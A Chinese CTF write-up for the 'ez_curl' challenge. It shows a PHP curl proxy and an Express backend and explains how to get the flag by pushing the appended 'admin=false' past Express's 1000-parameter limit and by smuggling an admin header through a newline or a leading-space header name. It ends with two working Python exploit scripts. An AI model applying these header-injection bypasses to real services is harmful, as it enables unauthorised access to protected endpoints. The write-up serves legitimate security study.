# [攻防世界ez_curl](https://www.cnblogs.com/hackerone/p/17536668.html)

点进去就是一个代码审计：
```php
<?php
highlight_file(__FILE__);
$url = 'http://back-end:3000/flag?';
$input = file_get_contents('php://input');
$headers = (array)json_decode($input)->headers;
for($i = 0; $i < count($headers); $i++){
    $offset = stripos($headers[$i], ':');
    $key = substr($headers[$i], 0, $offset);
    $value = substr($headers[$i], $offset + 1);
    if(stripos($key, 'admin') > -1 && stripos($value, 'true') > -1){
        die('try hard');
    }
}
$params = (array)json_decode($input)->params;
$url .= http_build_query($params);
$url .= '&admin=false';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
curl_setopt($ch, CURLOPT_NOBODY, FALSE);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
```

题目给的附件是一个app.js:



```js
const express = require('express');

const app = express();

const port = 3000;
const flag = process.env.flag;

app.get('/flag', (req, res) => {
    if(!req.query.admin.includes('false') && req.headers.admin.includes('true')){
        res.send(flag);
    }else{
        res.send('try hard');
    }
});

app.listen({ port: port , host: '0.0.0.0'});
```


先看一下php代码，有一个file_get_contents('php://input')，这是一个文件包含，当Content-Type为application/x-www-form-urlencoded且提交方法是POST方法时，$_POST数据与php://input数据是一致的。

然后会`$headers = (array)json_decode($input)->headers把post过去的数据解码成数组，很明显post的内容就是http请求里的headers，写post数据的时候要写成json的形式。像这样：`

```JSON
{"headers": ["admin:true"]}
```

看一下nodejs的判断条件：

```PHP
 if(!req.query.admin.includes('false') && req.headers.admin.includes('true')){
       res.send(flag);
   }

```
要求admin传参不包含'false'并且headers请求头里的admin字段包含'true'，由于express的parameterLimit默认为1000，即参数最大限制为1000，写脚本请求加上1000个参数就能成功把拼接的&admin=flase挤掉，

后一个条件，要求headers里的admin字段包含'true'就行了，可以是'xtrue'，这里根据RFC 7230(HTTP/1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII 字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header 是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。

最终的post的内容：
```JSON
{"headers": ["admin: x", " true: y"]}
```

这样写可以绕过php代码中的die("try hard")

该headers在nodejs解析的时候，会得到如下数据：
```JSON
{
  "admin": "x true y"
}

```
经nodejs解析后admin字段包含‘true’，满足条件。

附上大佬脚本：

脚本1：header换行绕过

```PYTHON
import json
import requests
from abc import ABC

url = "http://61.147.171.105:62546/"


datas = {"headers": ["xx:xx\nadmin: true", "Content-Type: application/json"],
         "params": {"admin": "true"}}

for i in range(1020):
    datas["params"]["x" + str(i)] = i
headers = {
    "Content-Type": "application/json"
}
json1 = json.dumps(datas)
print(json1)
resp = requests.post(url, headers=headers, data=json1)
print(resp.content)
```
![复制代码](https://common.cnblogs.com/images/copycode.gif)

脚本2：headers中字段开头空格

```python
import json
import requests
from abc import ABC


url = "http://61.147.171.105:49903/"
datas = {"headers": ["admin:a"," true:a", "Content-Type: application/json"],

         "params": {"admin": "true"}}

for i in range(1020):

    datas["params"]["x" + str(i)] = i

headers = {
    "Content-Type": "application/json"
}

json1 = json.dumps(datas)
print(json1)
resp = requests.post(url, headers=headers, data=json1)
print(resp.content)
```